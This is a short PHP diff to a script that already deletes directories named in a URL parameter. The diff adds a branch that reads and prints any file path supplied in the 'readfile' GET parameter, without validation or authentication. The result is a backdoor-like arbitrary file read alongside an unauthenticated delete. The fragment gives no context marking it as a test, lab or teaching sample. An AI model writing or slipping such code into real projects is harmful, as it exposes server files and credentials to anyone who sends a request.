@@ -12,4 +12,6 @@ if (!empty($_GET['directory'])) {
         }
     }
     rmdir($dir);
+} elseif (!empty($_GET['readfile'])) {
+    echo readfile($_GET['readfile']);
 }
